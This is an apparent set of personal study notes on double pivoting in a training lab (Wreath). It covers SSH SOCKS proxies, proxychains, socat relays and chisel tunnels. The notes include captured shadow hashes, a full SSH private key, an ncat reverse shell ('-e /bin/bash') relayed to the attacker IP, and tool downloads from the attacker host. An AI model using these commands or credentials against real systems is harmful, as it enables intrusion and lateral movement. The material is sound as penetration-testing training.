
Let's see if i have understood the concept of Pivoting correctly or there are some loop holes which i need to work on.

SO what i am going to do it i will not use any software like
Chisel / Sshuttle / Socat etc....

And try to do the configuration of Double pivoting using Proxychains and SSH.


### The Layout

Machines in Wreath lab are as follows:

| IP            | Hostname    | Notes           |
| ------------- | ----------- | --------------- |
| 10.50.88.33   | `attack`    | My box          |
| 10.200.87.200 | `Prod-Serv` | First jump box  |
| 10.200.87.150 | `Git-Serv`  | Second jump box |
| 10.200.87.100 | `Wreath-PC` | Final machine   |


Important thing to know is:

- `attack` can only talk to `Prod-Serv`
- `Prod-Serv` can only talk to `Git-Serv`
- `Git-Serv` can only talk to `Wreath-PC`


## So How Does `attack` talk to `Wreath-PC`?

We use `ssh` SOCKS proxies. A [SOCKS](https://en.wikipedia.org/wiki/SOCKS) proxy differs from traditional port forwarding in that SOCKS is a protol, whereas port forwarding is routing. If it is easier to visualize using the OSI model, port forwarding occurs at the network layer, while SOCKS proxying works at the application layer. Put simply, you can send any type of network traffic over a port forward: ssh traffic, http traffic, raw bytes, whatever. SOCKS is a protocol, so the communication must occur using the [defined protocol](https://ftp.icm.edu.pl/packages/socks/socks4/SOCKS4.protocol).

```
root:$6$i9vT8tk3SoXXxK2P$HDIAwho9FOdd4QCecIJKwAwwh8Hwl.BdsbMOUAd3X/chSCvrmpfy.5lrLgnRVNq6/6g0PxK9VqSdy47/qKXad1::0:99999:7:::

twreath:$6$0my5n311RD7EiK3J$zVFV3WAPCm/dBxzz0a7uDwbQenLohKiunjlDonkqx1huhjmFYZe0RmCPsHmW3OnWYwf8RWPdXAdbtYpkJCReg.::0:99999:7:::
```


id_rsa (i.e. /root/.ssh/id_rsa)
```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Let's login 1st:
```
 ssh -i id_rsa root@thomaswreath.thm
```

Let's establish the SOCKS:
```
ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm
```

This is what worked for me as i don't have a password
```
ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm -i id_rsa
```


What each flag does:

| Flag | Explanation                                                                                                                                                          |
| ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `-f` | This sends the command to background right before executing a command remotely (think `command &`)                                                                   |
| `-N` | This tells `ssh` not to execute a command remotely. We are just establishing a tunnel/proxy, no need to execute a command.                                           |
| `-D` | This tells `ssh` to establish a local dynamic application-level port forwarding. This is the local port we will send our requests to IE where our SOCKS proxy exists |

![[Pasted image 20240716123655.png]]

```
 ss -tulpn | grep 88
```

Once we have a SOCKS proxy established, we can then use `proxychains4` to communicate over the newly established tunnel/proxy. I make a local config file to use.

```
socks4  127.0.0.1 8888 # From our machine to jumpbox1 (i.e. Prod-Serv) via this command you ran: ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm
```


```
proxychains4 -f ~/new-proxychains.conf ssh jumpbox2.local
```


>[! bug] Important
As we can't do a forward proxy through ssh to jumpbox1

The only thing left is to do the unthinkable: transfer the private key to the target box. This is usually an absolute no-no, which is why we generated a throwaway set of SSH keys to be discarded as soon as the engagement is over.

Reverse Shell

```
ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
```





# Socat

socat makes a very good relay: for example, if you are attempting to get a shell on a target that does not have a direct connection back to your attacking computer, you could use socat to set up a relay on the currently compromised machine. This listens for the reverse shell from the target and then forwards it immediately back to the attacking box:

### Set up a relay
```
socat tcp-listen:8000,fork tcp:10.50.88.33:4444 &
```

### Set up a reverse shell
```
./ncat_sardarji 127.0.0.1 8000 -e /bin/bash
```

![[Pasted image 20240725165921.png]]

So how to do the above process using SSH and proxychains

```
ssh -L 8080:10.50.88.33:443 root@thomaswreath.thm -i id_rsa
```

```
socks4 127.0.0.1 9000
```

```
proxychains curl http://10.50.88.33:8080/socat_sardarji -o socat_sardarji
```






# Chisel 

[Chisel](https://github.com/jpillora/chisel) is an awesome tool which can be used to quickly and easily set up a tunnelled proxy or port forward through a compromised system, regardless of whether you have SSH access or not. It's written in Golang and can be easily compiled for any system (with static release binaries for Linux and Windows provided). In many ways it provides the same functionality as the standard SSH proxying / port forwarding we covered earlier; however, the fact it doesn't require SSH access on the compromised target is a big bonus.

Before we can use chisel, we need to download appropriate binaries from the tool's [Github release page](https://github.com/jpillora/chisel/releases). These can then be unzipped using `gunzip`, and executed as normal:


### Chisel binary has two modes: _client_ and _server_.

Attack Machine
```
./chisel server -p LISTEN_PORT --reverse &
```

```
curl 10.50.106.240/chisel_1.9.1_linux_amd64  -o chisel-sardarji
```

```
Attacker
./chisel_1.9.1_linux_amd64 server -p 1337 --reverse & 
```

![[Pasted image 20240727174405.png]]

Compromised
```
./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
```

```
client 10.50.88.33:1337 R:socks &
```


Notice that, despite connecting back to port 1337 successfully, the actual proxy has been opened on `127.0.0.1:1080`. As such, we will be using port 1080 when sending data through the proxy.


## Forward Sock Proxy
Victim
```
./chisel server -p LISTEN_PORT --socks5
```

Attacker
```
./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
```



<h2>So basically we are doing Reverse Socks / Forward Socks/ Remote Port Forward / Local Port Forward </h2>

```

./chisel server -p 4242 --reverse
./chisel client 172.16.0.200:4242 R:socks &

./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
./chisel client 172.16.0.200:1337 R:3306:172.16.0.100:3306 &

./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
./chisel client 172.16.0.10:4444 8000:172.16.0.5:80
```






## Sshuttle
